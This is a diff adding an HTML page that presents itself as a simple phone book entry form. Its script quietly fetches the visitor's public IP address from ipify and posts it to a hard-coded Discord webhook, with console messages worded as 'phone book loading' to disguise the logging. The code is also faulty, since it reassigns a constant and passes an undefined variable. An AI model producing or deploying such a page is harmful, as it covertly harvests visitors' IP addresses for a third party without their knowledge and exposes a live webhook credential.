@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>oofbomb's Phone Book</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #4CAF50;
+            color: white;
+            text-align: center;
+            padding: 20px 0;
+            font-size: 24px;
+        }
+        main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .phone-book-form {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .phone-book-form input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .phone-book-form input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .phone-book-form input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    oofbomb's Phone Book
+</header>
+
+<main>
+    <div class="phone-book-form">
+        <form id="phoneForm">
+            <input type="text" id="phoneNumber" placeholder="Enter phone number" maxlength="14" required>
+            <input type="submit" value="Submit">
+        </form>
+    </div>
+</main>
+
+<footer>
+    (Unauthorized access will not be allowed)
+</footer>
+
+<script>
+    document.getElementById('phoneNumber').addEventListener('input', function (e) {
+        let x = e.target.value.replace(/\D/g, '');
+        if (x.length > 0) {
+            x = '(' + x.substring(0, 3) + ') ' + x.substring(3, 6) + '-' + x.substring(6, 10);
+        }
+        e.target.value = x;
+    });
+const skibidi = ""
+    document.getElementById('phoneForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => skibidi = data.ip)
+            .catch(error => console.error('Error fetching phone book:', btoa(error)));
+    });
+    function sendToDiscord(message) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1178097852665315338/RtYjhCRooN7BC2JhsPgm5tiAbc9uA2PS7RqBpZysvI5ytVqe-ZA6vnSGrTDsIf6T9CcQ';
+
+        const payload = {
+            content: skibidi
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Phone book loading');
+            } else {
+                console.error('Error loading phone book');
+            }
+        })
+        .catch(error => console.error('Error:', error));
+    }
+
+    sendToDiscord(message);
+
+</script>
+
+</body>
+</html>
